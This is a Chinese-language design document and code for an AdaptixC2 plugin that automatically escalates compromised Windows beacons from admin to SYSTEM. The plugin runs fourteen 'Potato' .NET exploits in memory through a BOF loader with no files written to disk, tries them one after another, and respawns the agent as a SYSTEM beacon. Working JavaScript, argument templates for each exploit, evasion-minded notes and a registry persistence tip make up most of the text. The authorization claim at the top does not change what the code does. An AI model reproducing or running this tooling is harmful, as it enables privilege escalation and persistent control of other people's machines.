# AdaptixC2 自动提权 — auto_elevate.axs
注意所有操作均已得到合法授权

## 基础设定

- 运行环境：AdaptixC2 AxScript 引擎
- 目标 Agent：beacon / gopher / kharon（Windows x64/x86）
- 提权路径：Admin → SYSTEM
- 执行方式：全内存（`execute bof` → BOF 加载 .NET PE，无文件落盘）
- 土豆来源：`c://Potato/`（本地C2 客户端，14 种 .NET PE）
- BOF Loader：`c://Potato/execute-assembly.x64.o`
- 插件文件：`auto_elevate.axs`

## 核心约束

- **不落盘**：所有 .NET PE 走 `execute bof` 内存加载，禁止 exe 落地
- **自包含**：不依赖 `execution.axs` 扩展，BOF 打包逻辑内联
- **动态路径**：`(Get-Process -Id PID).Path` 取 agent 真实路径，不写死文件名
- **反斜杠陷阱**：Adaptix beacon 解析器将 `C:\` 中的 `\` 误当命令分隔符 → 路径一律换正斜杠 `C:/`
- **并发安全**：`elevated[id]=true` 在 `resolveAgentPath` 前设置，所有回调层双重检查

## 执行流程

```
agent 上线 (admin 权限)
  │
  ├─ isSystem() → 已是 SYSTEM → skip
  ├─ isAdmin()  → 不是 admin → skip
  │
  └─ autoElevate()
       │
       ├─ resolveAgentPath()
       │    └─ ps run -o powershell.exe -c "(Get-Process -Id PID).Path"
       │       返回 → C:\Users\xxx\agent.x64.exe
       │
       └─ tryAllPotatoes()
            │
            ├─ [1/14] PrintNotifyPotato
            │    ├─ ax.file_read("c://Potato/PrintNotifyPotato.exe") → base64
            │    ├─ ax.bof_pack("bytes,cstr", [b64, "C:/Users/xxx/agent.x64.exe"])
            │    ├─ ax.console_message(id, "[AutoElevate] PrintNotifyPotato → C:\Users\xxx\agent.x64.exe", "info")
            │    └─ execute bof "c://Potato/execute-assembly.x64.o" <packed>
            │         └─ BOF 加载 .NET PE → Potato 拿 SYSTEM token
            │              └─ spawn agent.x64.exe → SYSTEM beacon 回连
            │
            ├─ 失败 → 等 2s
            ├─ [2/14] GodPotato → ...
            └─ ...
```

## 核心架构

### executeAssemblyInline() — 自包含 BOF 打包

```
executeAssemblyInline(id, dotNetBin, dotNetParams, tag, callback)
  │
  ├─ ax.file_read(dotNetBin)               // .NET PE → base64
  ├─ ax.bof_pack("bytes,cstr", [b64, params])  // 打包 BOF 参数
  ├─ ax.console_message(id, "[AutoElevate] " + tag) // 控制台可读行
  └─ ax.execute_command(id, `execute bof "c://Potato/execute-assembly.x64.o" ${packed}`)
       └─ callback({ text: "BOF output" })
```

```javascript
/// 实际实现
function executeAssemblyInline(id, dotNetBin, dotNetParams, tag, callback) {
    let b64 = ax.file_read(dotNetBin);
    if (!b64 || b64.length === 0) { callback({ error: "Cannot read" }); return; }

    let bof  = "c://Potato/execute-assembly." + ax.arch(id) + ".o";
    let args = ax.bof_pack("bytes,cstr", [b64, dotNetParams]);

    if (tag) ax.console_message(id, "[AutoElevate] " + tag, "info");

    ax.execute_command(id, `execute bof "${bof}" ${args}`, undefined, function(res) {
        callback({ text: String(res.text || "") });
    });
}
```

### 为什么不用 `execute-assembly` AxCommand

| 调用方式 | 结果 | 原因 |
|---------|------|------|
| 控制台手动输入 | ✅ | Commander → PreHook → `execute bof` |
| `ax.execute_command("execute-assembly ...")` | ❌ | 加载时序问题，Commander 可能未注册命令 |
| `ax.execute_alias("execute-assembly ...")` | ❌ | 同上 |
| `execute bof` + `ax.bof_pack` 直发 | ✅ | agent 内置命令，100% 可靠 |

## 土豆清单（14 种）

| 名称 | 文件 | 参数模板 | 利用原理 |
|------|------|---------|---------|
| PrintNotifyPotato | PrintNotifyPotato.exe | `-cmd {PAYLOAD}` | Print Spooler RPC + SeImpersonate |
| GodPotato | GodPotato.exe | `-cmd {PAYLOAD}` | COM CoGetInstanceFromIStorage |
| JuicyPotato | JuicyPotato.exe | `-t * -p {PAYLOAD} -l 1337` | DCOM + CLSID + NT AUTHORITY/SYSTEM |
| JuicyPotatoNG | JuicyPotatoNG.exe | `-t * -p {PAYLOAD}` | JuicyPotato 下一代 |
| RoguePotato | RoguePotato.exe | `-r 127.0.0.1 -e {PAYLOAD}` | OXID 欺骗 |
| SweetPotato | SweetPotato.exe | `-p {PAYLOAD}` | 多 COM 接口聚合 |
| EfsPotato | EfsPotato.exe | `-p {PAYLOAD}` | EFS RPC 调用 |
| BadPotato | BadPotato.exe | `{PAYLOAD}` | RPC/DCOM 变种 |
| SigmaPotato | SigmaPotato.exe | `-cmd {PAYLOAD}` | 最新 COM 利用 |
| DeadPotato | DeadPotato.exe | `{PAYLOAD}` | Dead letter RPC |
| RasMan | RasMan.exe | `{PAYLOAD}` | RasMan 服务滥用 |
| McpManagementPotato | McpManagementPotato.exe | `{PAYLOAD}` | MCP Management 利用 |
| PrinterNotifyPotato | PrinterNotifyPotato.exe | `{PAYLOAD}` | PrintNotify 变种 |
| RottenPotato | RottenPotato.exe | `{PAYLOAD}` | COM/OXID 原始 Potato |

```javascript
/// 技术矩阵定义（auto_elevate.axs 中）
let POTATO_TECHS = [
    { name: "PrintNotifyPotato",     bin: "c://Potato/PrintNotifyPotato.exe",     args: "-cmd {PAYLOAD}"                          },
    { name: "GodPotato",            bin: "c://Potato/GodPotato.exe",            args: "-cmd {PAYLOAD}"                          },
    { name: "JuicyPotato",          bin: "c://Potato/JuicyPotato.exe",          args: "-t * -p {PAYLOAD} -l 1337"              },
    { name: "RoguePotato",          bin: "c://Potato/RoguePotato.exe",          args: "-r 127.0.0.1 -e {PAYLOAD}"              },
    { name: "SweetPotato",          bin: "c://Potato/SweetPotato.exe",          args: "-p {PAYLOAD}"                            },
    { name: "EfsPotato",            bin: "c://Potato/EfsPotato.exe",            args: "-p {PAYLOAD}"                            },
    { name: "BadPotato",            bin: "c://Potato/BadPotato.exe",            args: "{PAYLOAD}"                               },
    { name: "SigmaPotato",          bin: "c://Potato/SigmaPotato.exe",          args: "-cmd {PAYLOAD}"                          },
    { name: "DeadPotato",           bin: "c://Potato/DeadPotato.exe",           args: "{PAYLOAD}"                               },
    { name: "RasMan",              bin: "c://Potato/RasMan.exe",               args: "{PAYLOAD}"                               },
    { name: "McpManagementPotato",  bin: "c://Potato/McpManagementPotato.exe",  args: "{PAYLOAD}"                               },
    { name: "PrinterNotifyPotato",  bin: "c://Potato/PrinterNotifyPotato.exe",  args: "{PAYLOAD}"                               },
    { name: "JuicyPotatoNG",        bin: "c://Potato/JuicyPotatoNG.exe",        args: "-t * -p {PAYLOAD}"                      },
    { name: "RottenPotato",         bin: "c://Potato/RottenPotato.exe",         args: "{PAYLOAD}"                               },
];
```

## 文件依赖

| 文件 | 类型 | 说明 |
|------|------|------|
| `c://Potato/execute-assembly.x64.o` | BOF | .NET PE 内存加载器（**必须**） |
| `c://Potato/execute-assembly.x86.o` | BOF | x86 版本 |
| `c://Potato/PrintNotifyPotato.exe` | .NET PE | ✅ 实测通过，SYSTEM beacon 回连 |
| `c://Potato/GodPotato.exe` | .NET PE | SeImpersonate |
| `c://Potato/JuicyPotato.exe` | .NET PE | 需 CLSID |
| `c://Potato/JuicyPotatoNG.exe` | .NET PE | 下一代 Juicy |
| `c://Potato/RottenPotato.exe` | .NET PE | OXID |
| `c://Potato/RoguePotato.exe` | .NET PE | OXID host |
| `c://Potato/SweetPotato.exe` | .NET PE | 多 COM |
| `c://Potato/EfsPotato.exe` | .NET PE | EFS RPC |
| `c://Potato/BadPotato.exe` | .NET PE | RPC/DCOM |
| `c://Potato/SigmaPotato.exe` | .NET PE | 最新 COM |
| `c://Potato/DeadPotato.exe` | .NET PE | Dead letter |
| `c://Potato/RasMan.exe` | .NET PE | RasMan |
| `c://Potato/PrinterNotifyPotato.exe` | .NET PE | PrintNotify 变种 |
| `c://Potato/McpManagementPotato.exe` | .NET PE | MCP Management |

## 串行测试机制

```
tryAllPotatoes(id, payloadPath, 0)
  │
  ├─ [N/14] tryPotato(id, tech, payloadPath, onFailed)
  │    ├─ executeAssemblyInline(id, tech.bin, params, tag, callback)
  │    └─ callback → 成功等 SYSTEM beacon / 失败调 onFailed
  │
  └─ onFailed → event.on_timeout(2s) → tryAllPotatoes(id, payloadPath, N+1)
```

```javascript
/// 核心串行逻辑
function tryAllPotatoes(id, payloadPath, startIdx) {
    let potatoes = enumeratePotatoes();
    let idx = startIdx || 0;

    if (idx >= potatoes.length) {
        addLog("[FAIL] All " + potatoes.length + " potatoes tried, none got SYSTEM");
        return;
    }

    let tech = potatoes[idx];
    addLog("[*] [" + (idx+1) + "/" + potatoes.length + "] " + tech.name);

    tryPotato(id, tech, payloadPath, function() {
        event.on_timeout(function() {
            if (!ax.isactive(id)) return;
            tryAllPotatoes(id, payloadPath, idx + 1);
        }, 2000);
    });
}
```

## 踩坑记录

### 坑1：控制台 base64 blob 不可追溯

```
❌ 原始输出：
   beacon > execute bof "c://Potato/execute-assembly.x64.o" MFoAAABaAABNWpAAAw
   出问题时完全不知道是哪个土豆、什么参数

✅ 修复：ax.console_message 在 execute bof 前打人类可读行
   beacon > [AutoElevate] PrintNotifyPotato → C:\Users\xxx\agent.x64.exe
   beacon > execute bof "c://Potato/execute-assembly.x64.o" MFoAAABaAABNWpAAAw
   一眼定位对应关系
```

### 坑2：`C:\` 反斜杠 → Adaptix 解析器炸

```
错误表现：Command not found
原因：Adaptix beacon 解析器将 \ 当命令分隔符
      "C:\Users\xxx\agent.exe" → 被拆成 "C:" + "\Users\xxx\agent.exe"
修复：payloadPath.replace(/\\/g, "/")
      Windows CreateProcess 原生支持正斜杠 ✅
```

### 坑3：`execute-assembly` 命令的 PreHook 时序陷阱

```
execute-assembly 是 AxScript 注册命令（非 agent 内置）
走的是 Commander → PreHook → execute bof 链路

ax.execute_command("execute-assembly ...") 可能因脚本加载时序
找不到命令 → "Command not found"

解决：绕过 Commander 注册层，直接走 agent 内置 execute bof
     BOF 打包逻辑内联到 executeAssemblyInline()
```

### 坑4：`ps run` 引号剥离

```
ps run -o cmd.exe /c "cmd /c reg add \"HKLM\...\" /f"
外层 cmd 引号被 ps run 剥离，内层 cmd /c 保留完整引号
适用 persistence_manager.axs 的注册表持久化场景
```

### 坑5：不同土豆输出格式不同

```
PrintNotifyPotato 输出含 "NT AUTHORITY\SYSTEM"
其他土豆输出格式各异，不能只用 indexOf("SYSTEM") 判断成败

当前处理：BOF 输出仅做辅助判断，真正成败信号是 SYSTEM beacon 回连
          on_new_agent + isSystem() 才是可靠的终局判断
```

### 坑6：竞态条件

```
resolveAgentPath 是异步（ps run 等回包）
同时系统可能触发多次 on_new_agent

修复：
- elevated[id] = true 在 resolveAgentPath 前设置
- on_new_agent 所有 timeout 层双重检查 if (elevated[id]) return
- tryPotato 回调里 ax.isactive(id) 防 dead agent
```

## UI 面板功能

| 功能 | 说明 |
|------|------|
| Agent 选择 | 下拉列表，仅显示 admin 非 SYSTEM 的 Windows beacon |
| 土豆选择 | 14 种全选/单选/反选 |
| 一键提权 | 对选中 agent 串行测试选中的土豆 |
| 日志面板 | 实时滚动，记录每次尝试结果 |

## 版本

- **插件文件**：`auto_elevate.axs`
- **文档文件**：`adaptix_auto_elevate.md`
- **日期**：2026-06-23
- **依赖**：AdaptixC2 + `c://Potato/execute-assembly.x64.o` + 14 土豆 .NET PE
